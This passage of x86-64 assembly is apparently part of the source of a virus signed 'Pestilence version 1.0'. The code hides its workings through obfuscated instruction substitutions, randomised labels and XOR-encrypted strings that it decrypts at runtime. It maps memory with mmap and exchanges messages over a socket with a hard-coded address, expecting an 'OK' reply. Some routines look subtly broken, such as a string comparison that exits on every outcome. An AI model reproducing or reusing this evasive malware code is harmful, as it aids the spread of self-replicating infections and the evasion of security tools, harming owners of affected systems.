call c1YH1
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
push rdi
jmp sr2JAYW13a
; manage iTLlKa
KTahx:
push rbp
mov rbp, rsp 
call yyAHp
cmp rax, 0 
jl CECe1Wj5
WZc2zrEdo:
;rdi == sockfd
push rax
push rax
call lTWcmLZGG
add rsp, 8
mov rdi, rax
pop rax
push SYS_SENDTO
call FL7u5b
add rsp, 8
lea rsi, [rel cSrp3R]
push rax
push xdhn8
call o9hXRy0
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
test rax, rax
js CECe1Wj5
SQXjkM7:
push rdi
push 35
call c1YH1
add rsp, 8
lea rdi, [rel jtyLOm]
xor rsi, rsi
syscall
pop rdi
MFj7VoH:
;* rdi == sockfd
push SYS_RECVFROM
call FL7u5b
add rsp, 8
sub rsp, 200 
mov rsi, rsp
push rax
push 200
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
syscall
test rax, rax
js CECe1Wj5
y6sXp:
;* rdi == sockfd
mov rsi, rsp
call L211Zw
push rax
push rsp
push rax
call ngKkUJUwjQ
add rsp, 8
pop rsp
mov rsp, rax
pop rax
sub rsp, 2 
cmp WORD [rsp], 0x4b4f 
jne KLmEzhJ2F
CECe1Wj5:
call s5uXEWlY0
push 0
call o9hXRy0
add rsp, 8
jmp dLMaerD4
KLmEzhJ2F:
call s5uXEWlY0
push -1
call FL7u5b
add rsp, 8
jmp dLMaerD4
;;**;;
FL7u5b:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, -1
bzhi rax, rcx, rdx

pop rdx
pop rcx
ret
o9hXRy0:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, (64 << 8) | 0 ; flag pour le mov de bextr
bextr rax, rcx, rdx ; mov rax, rcx

pop rdx
pop rcx
ret
lTWcmLZGG:
push rcx
push rbx
mov rbx, qword [rsp + 8 + 16]

mov rax, 0
mov rcx, 0x3d42f
cmpxchg rbx, rcx

pop rbx
pop rcx
ret
c1YH1:
push rbx
push rcx
mov rcx, qword [rsp + 8 + 16]

mov rax, 0
mov rbx, 0
cmpxchg rbx, rcx
mov rax, rbx
pop rcx
pop rbx
ret
ngKkUJUwjQ:
push rcx
mov rax, qword [rsp + 16 + 8]
mov rcx, qword [rsp + 8 + 8]

test rcx, rcx ; is rcx == 0 ?
jnz sub
jnc do_adc
jmp RAjcw3zk

sub:
sub rcx, 1
jnc RAjcw3zk ; Jump if Carry Flag is Not set (CF=0)
jmp do_adc ; Jump to ADC instruction
RAjcw3zk: 
cmc ; Complement CF, making it 1
do_adc: ; Perform ADC with prepared carry flag
adc rax, rcx; RAX = RAX + rcx + CF

pop rcx
ret
; rax: int *_map_int_table( void )
BfYAK22e:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
push SYS_MMAP
call o9hXRy0
add rsp, 8
push rax
push 0x0
call lTWcmLZGG
add rsp, 8
mov rdi, rax
pop rax
push rax
push 0x1d0
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
push rax
push 0x22
call c1YH1
add rsp, 8
mov r10, rax
pop rax
push rax
push -1
call o9hXRy0
add rsp, 8
mov r8, rax
pop rax
push rax
push 0x0
call FL7u5b
add rsp, 8
mov r9, rax
pop rax
syscall
cmp rax, -1
jl bC7yYC
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x00000100
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00000000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00460000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00000000
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000098
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x00020000
mov dword [rax + 232], 0x00000000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00000000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x004c0000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x00000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00021000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x00000000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00000000
mov dword [rax + 292], 0x0000004b
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x40000000
mov dword [rax + 312], 0x0000001f
mov dword [rax + 316], 0x00000000
mov dword [rax + 320], 0x00000000
mov dword [rax + 324], 0x00000096
mov dword [rax + 328], 0x00000000
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00000000
mov dword [rax + 340], 0x00000000
mov dword [rax + 344], 0x60930000
mov dword [rax + 348], 0x6e000040
mov dword [rax + 352], 0x00000001
mov dword [rax + 356], 0x00000101
mov dword [rax + 360], 0x2e010100
mov dword [rax + 364], 0x02010001
mov dword [rax + 368], 0x00000000
mov dword [rax + 372], 0x00450100
mov dword [rax + 376], 0x01200000
mov dword [rax + 380], 0x00010100
mov dword [rax + 384], 0x01000001
mov dword [rax + 388], 0x00580005
mov dword [rax + 392], 0x0100010a
mov dword [rax + 396], 0x00100101
mov dword [rax + 400], 0x0001010a
mov dword [rax + 404], 0x02c8c823
mov dword [rax + 408], 0x0100004f
mov dword [rax + 412], 0x00000100
mov dword [rax + 416], 0x30090a01
mov dword [rax + 420], 0x0900003c
mov dword [rax + 424], 0x1e010000
mov dword [rax + 428], 0x0a0c7e40
mov dword [rax + 432], 0x0d000a0d
mov dword [rax + 436], 0x000a0c0a
mov dword [rax + 440], 0x0b08037f
mov dword [rax + 444], 0x2d2c2a29
mov dword [rax + 448], 0x00d9654d
mov dword [rax + 452], 0x00400201
mov dword [rax + 456], 0x13120804
mov dword [rax + 460], 0x80390717
bC7yYC:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
ButMi9:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len HWoifLlr8p
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> HWoifLlr8p
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
push rax
push rdi
call c1YH1
add rsp, 8
mov rbx, rax
pop rax
push rax
push rsi
call FL7u5b
add rsp, 8
mov r12, rax
pop rax
; addr = NULL (let kernel choose)
xor rdi, rdi 
; PROT_READ | PROT_WRITE = 1 | 2 = 3
push rax
push 0x03
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
push rax
push 0x22
call o9hXRy0
add rsp, 8
mov r10, rax
pop rax
; b13nWv9p = -1
push rax
push -1
call c1YH1
add rsp, 8
mov r8, rax
pop rax
; offset = 0
xor r9, r9 
; syscall number for mmap
push 9
call lTWcmLZGG
add rsp, 8
syscall
cmp rax, 0
jl BBVu45D8A
push rax
push rax
call FL7u5b
add rsp, 8
mov r11, rax
pop rax
lea rsi, HWoifLlr8p
call L211Zw
push rax
push rax
call o9hXRy0
add rsp, 8
mov r9, rax
pop rax
xor rcx, rcx
xor rdx, rdx
mnw8bQ944:
cmp rcx, r12
jge BBVu45D8A
push rcx
call o9hXRy0
add rsp, 8
xor rdx, rdx
cmp rcx, 0
jne xEPIoCC
xor rax, rax
jmp WqspnzzB6K
xEPIoCC:
div r9
WqspnzzB6K:
; r10 == HWoifLlr8p[rcx % HWoifLlr8p_len]
movzx r10, byte [rsi + rdx] 
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp mnw8bQ944
BBVu45D8A:
push r11
call c1YH1
add rsp, 8
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
; strcpy(dst:rsi src: rdi)
VU3tuqQBn:
xor rcx, rcx
BkpgcfGUa:
cmp byte[rdi + rcx], 0 
je cFnvC
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
push rax
push rcx
push 1
call ngKkUJUwjQ
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp BkpgcfGUa
cFnvC:
ret
EWcFw:
call VU3tuqQBn
mov byte [rsi + rcx], 0 
ret
; strncpy(dst:rsi, src: rdi, count: rcx)
z7LVJ:
sub rcx, 1 
gt1Vl:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop gt1Vl
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret
; strlen(str:rsi)
L211Zw:
xor rcx, rcx
O5DgOBe:
cmp byte [rsi + rcx], 0 
je NSTSWsxhH
inc rcx
jmp O5DgOBe
NSTSWsxhH:
push rcx
call FL7u5b
add rsp, 8
ret
; strcmp(rdi, rsi)
ec26Kimo:
xor rcx, rcx
xor rax, rax
Fo8wvkmdkO:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl Jmfdv0
je Jmfdv0
jg Jmfdv0
cmp al, 0 
je Jmfdv0
push rax
push rcx
push 1
call ngKkUJUwjQ
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp Fo8wvkmdkO
Jmfdv0:
movzx rax, al
movzx r8, bl
sub rax, r8
ret
; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
OtFA7zbUu:
push rax
push 10
call lTWcmLZGG
add rsp, 8
mov r9, rax
pop rax
call GLMP9Sq5
ret
GLMP9Sq5:
cmp rax, 9 
jg OKSZ8t
push rax
push ax
call lTWcmLZGG
add rsp, 8
mov [rsi], rax
pop rax
add byte [rsi], 48 
inc rsi
ret
OKSZ8t:
push rax
xor rdx, rdx
div r9
call GLMP9Sq5 
pop rax
push rax
xor rdx, rdx
div r9
push rdx
call c1YH1
add rsp, 8
call GLMP9Sq5 
pop rax
ret
push rax
push rax
call FL7u5b
add rsp, 8
mov [rsi + rcx], rax
pop rax
Rzg9OTYPoL:
mov rdi, INF(iTLlKa.Gcjh36XuTv)
mov rsi, INF(iTLlKa.rClpKBG)
push SYS_UNMAP
call o9hXRy0
add rsp, 8
syscall
jmp ZbUqJu4V
ZbUqJu4V:
push SYS_CLOSE
call lTWcmLZGG
add rsp, 8
mov rdi, INF(iTLlKa.XK4N2V)
syscall
mov qword INF(iTLlKa.XK4N2V), -1
jmp dLMaerD4
U4aTTKnVB:
push 60
call c1YH1
add rsp, 8
xor rdi, rdi
syscall
AJ35olyhlO db 0x03, 0x40, 0x57, 0x4A, 0x5D, 0x1D, 0x27, 0x38, 0x33, 0x33
KYur0VL equ $ - AJ35olyhlO
vTqPp db 0x03, 0x40, 0x57, 0x4A, 0x5D, 0x1D, 0x27, 0x38, 0x33, 0x01, 0x51
nTJ3oSJlXl equ $ - vTqPp
HWoifLlr8p db 0x2C, 0x34, 0x3A, 0x3A, 0x72, 0x69, 0x42, 0x4B, 0x47, 0x33, 0x51
W3sJG db 9, 0 
XYN7nxImp db 0x03, 0x34
LghQCuxC db 0x03, 0x46, 0x55, 0x55, 0x06, 0x46, 0x6C, 0x38, 0x34, 0x5B, 0x7E, 0x1F, 0x59, 0x40, 0x52, 0x55, 0x00, 0x00, 0x38, 0x2E, 0x23, 0x6C, 0x3A, 0x1B, 0x55, 0x47, 0x3A
IyAy8ZgDF equ $ - LghQCuxC
XrufRt21e db 0x5F, 0x47, 0x52, 0x17, 0x17, 0x0D, 0x70, 0x7E, 0x72, 0x02, 0x69, 0x5E, 0x6D, 0x75, 0x7B, 0x7B, 0x31, 0x5A, 0x0C, 0x31, 0x26, 0x70, 0x60, 0x12, 0x76, 0x70, 0x73, 0x0B, 0x3C, 0x3D, 0x07, 0x7E, 0x06, 0x72, 0x10, 0x3F, 0x65, 0x7F, 0x59, 0x49, 0x36, 0x0B, 0x2B, 0x31, 0x26, 0x00, 0x05, 0x0D, 0x1A, 0x76, 0x03, 0x6E, 0x02, 0x0A, 0x27, 0x23, 0x3F, 0x59, 0x08, 0x46, 0x5C, 0x57, 0x6A, 0x53, 0x18, 0x07, 0x06, 0x33, 0x05, 0x43, 0x24, 0x17, 0x69, 0x5F, 0x55, 0x4E, 0x20, 0x2A, 0x2C, 0x7B, 0x67, 0x54, 0x3E, 0x0A, 0x58, 0x5D, 0x5F, 0x7A, 0x16, 0x0C, 0x20, 0x22, 0x26, 0x5D, 0x51
fatSKa7qj equ $ - XrufRt21e
FYRVb:
dw 1 
dw 0x401E 
dd 0x100007E 
; padding
dq -1 
i1JxWe9dY equ $ - FYRVb
I2FWB9w db 0x7C, 0x7B, 0x69, 0x6E, 0x52, 0x46, 0x27, 0x33, 0x33, 0x41, 0x30, 0x1D, 0x58, 0x14, 0x72, 0x6E, 0x26, 0x39, 0x6D, 0x7B, 0x69, 0x02, 0x0D, 0x0C, 0x70, 0x5A, 0x72, 0x55, 0x01, 0x1D, 0x78, 0x6B, 0x76, 0x01, 0x67, 0x50, 0x1C, 0x1A, 0x0A, 0x14, 0x43, 0x53, 0x7A, 0x7B, 0x77, 0x03, 0x0D, 0x0C, 0x70, 0x5A, 0x79, 0x55, 0x1C, 0x1D, 0x27, 0x25, 0x33, 0x1E, 0x05, 0x07, 0x5C, 0x51, 0x00, 0x1A, 0x06, 0x0C, 0x3A, 0x3F, 0x68, 0x43, 0x3D, 0x1F, 0x45, 0x5A, 0x66, 0x5C, 0x2E, 0x07, 0x01, 0x24, 0x29, 0x47, 0x34, 0x10, 0x58, 0x19, 0x76, 0x5F, 0x1C, 0x0E, 0x36, 0x23, 0x7D, 0x13, 0x51
CqAW7Da equ $ - I2FWB9w
rqmOT1 db 12, 10, 13, 10, 0 
ltpUtVzL1 equ $ - rqmOT1
cSrp3R db 0x6B, 0x71, 0x6E, 0x1A, 0x5D, 0x00, 0x2C, 0x2D, 0x22, 0x50, 0x25, 0x17, 0x43, 0x5A, 0x1A, 0x72, 0x26, 0x3D, 0x12, 0x64, 0x77, 0x1D, 0x60, 0x22, 0x5E, 0x68, 0x54, 0x72, 0x1D, 0x1A, 0x36, 0x71, 0x67, 0x02, 0x63, 0x48, 0x02, 0x04, 0x14, 0x0A, 0x5C, 0x58, 0x78, 0x73, 0x77, 0x03, 0x61, 0x7E, 13, 10, 12, 10
xdhn8 equ $ - cSrp3R
jtyLOm:
; Secondes
dq -1 
dq 9999999 
Ij2xTuE db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
F8ZNh equ $ - Ij2xTuE
z6wn5S1:
